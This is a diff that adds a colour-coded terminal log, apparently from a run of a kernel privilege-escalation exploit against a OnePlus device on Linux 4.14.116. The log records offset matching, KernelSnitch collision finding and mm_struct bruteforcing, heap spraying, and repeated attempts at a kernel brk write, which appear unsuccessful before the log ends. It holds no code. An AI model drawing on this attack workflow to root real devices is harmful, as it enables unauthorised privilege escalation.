@@ -1,0 +1,82 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffffc002f640b0
+[32m[+] [0mstartup context pid=7390 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7390 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7390 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7390 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffffc02a4021a0 bootid_data=ffffffc02a6aa868 init_task=ffffffc02a40cf00 root_tg=ffffffc02a63d580 sysctl_bootid=ffffffc02a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x7ffffffff
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007e929170c8
+[33m[*] [0mpass A: 65536 candidates, bucket piled
+[33m[*] [0mpass B: re-measuring unpiled
+[33m[*] [0m  0000006e92179550  (1587 > 3x0)[33m[*] [0m  0000006e923b6738  (1584 > 3x0)[33m[*] [0m  0000006e923f2918  (1576 > 3x0)[33m[*] [0m  0000006e930dc068  (1613 > 3x0)[33m[*] [0m  0000006e935ba758  (1608 > 3x0)[33m[*] [0m  0000006e938d7040  (1605 > 3x0)[33m[*] [0m  0000006e94f845a8  (963 > 3x0)[33m[*] [0m  0000006e96191610  (1168 > 3x0)[33m[*] [0m  0000006e967ac6e8  (988 > 3x0)[33m[*] [0m  0000006e96970508  (974 > 3x0)[33m[*] [0m  0000006e969d5830  (964 > 3x0)[33m[*] [0m  0000006e96ac9fd0  (980 > 3x0)[33m[*] [0m  0000006e96f54428  (964 > 3x0)[33m[*] [0m  0000006e97d36338  (1038 > 3x0)[33m[*] [0m  0000006e983d1810  (1097 > 3x0)[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  4] start finding mm_struct [ffffffdfc0000000-ffffffe800000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffefc0000000-fffffff800000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffffc000000000-ffffffc800000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffe7c0000000-fffffff000000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffffc7c0000000-ffffffd000000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffffcfc0000000-ffffffd800000000]
+[33m[*] [0m[  7] start finding mm_struct [fffffff7c0000000-0000000000000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffffd7c0000000-ffffffe000000000]
+[33m[*] [0m[p3] bruteforce returned cnt=1 best=16[33m[*] [0m[probe] candidate 0/1 = 0xfffffff3cee20000
+[33m[*] [0mKernelSnitch bruteforce: state=4 found=0 mm_struct=0xfffffff3cee20000
+[33m[*] [0m[probe] base=fffffff3cee20000 payload_mode=0 entering skb payload[33m[*] [0m[p5] prepare_skb_payload returned ok[33m[*] [0m[p4] skb payload built, reclaim setup[33m[*] [0mdone
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0mVERIFY: target=fffffff3cee20148 (mm+brk) value=0000000cafeb0000
+[33m[*] [0mVERIFY: slot=6 target=fffffff3cee20148
+[33m[*] [0m=== VERIFY brk write === target=0xfffffff3cee20148 mode=3
+[33m[*] [0mattempt round (persisted) = 736
+[33m[*] [0m[T+316912ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=fffffff3cee20000
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+317446ms]   heap spray done
+[33m[*] [0mpvm overlay: target=fffffff3cee20148 value=0000000000000000 lock=fffffff3cee20000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+[33m[*] [0mconsumer: walk fired tid=14843 ret=0 errno=0 calls=1 success=1
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=14 walk_done=1 calls=1 success=1
+[33m[*] [0m[T+318456ms]   PI route done
+[33m[*] [0mVERIFY: slot=6 brk(0)=00000055e2d9f000 (orig 00000055e2d9f000)
+[33m[*] [0mVERIFY: slot=7 target=fffffff3cee20148
+[33m[*] [0m=== VERIFY brk write === target=0xfffffff3cee20148 mode=3
+[33m[*] [0mattempt round (persisted) = 737
+[33m[*] [0m[T+318458ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=fffffff3cee20000
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+319070ms]   heap spray done
+[33m[*] [0mpvm overlay: target=fffffff3cee20148 value=0000000000000000 lock=fffffff3cee20000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+[33m[*] [0mconsumer: walk fired tid=16138 ret=0 errno=0 calls=1 success=1
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=22 walk_done=1 calls=1 success=1
+[33m[*] [0m[T+320081ms]   PI route done
+[33m[*] [0mVERIFY: slot=7 brk(0)=00000055e2d9f000 (orig 00000055e2d9f000)
+[33m[*] [0mVERIFY: slot=8 target=fffffff3cee20148
+[33m[*] [0m=== VERIFY brk write === target=0xfffffff3cee20148 mode=3
+[33m[*] [0mattempt round (persisted) = 738
+[33m[*] [0m[T+320083ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=fffffff3cee20000
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+320949ms]   heap spray done
+[33m[*] [0mpvm overlay: target=fffffff3cee20148 value=0000000000000000 lock=fffffff3cee20000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=22 walk_done=1 calls=1 success=1
+[33m[*] [0mconsumer: walk fired tid=17433 ret=0 errno=0 calls=1 success=1
+[33m[*] [0m[T+321968ms]   PI route done
+[33m[*] [0mVERIFY: slot=8 brk(0)=00000055e2d9f000 (orig 00000055e2d9f000)
+[33m[*] [0mVERIFY: slot=9 target=fffffff3cee20148
+[33m[*] [0m=== VERIFY brk write === target=0xfffffff3cee20148 mode=3
+[33m[*] [0mattempt round (persisted) = 739
+[33m[*] [0m[T+321970ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=fffffff3cee20000
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+323299ms]   heap spray done
+[33m[*] [0mpvm overlay: target=fffffff3cee20148 value=0000000000000000 lock=fffffff3cee20000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+DONE
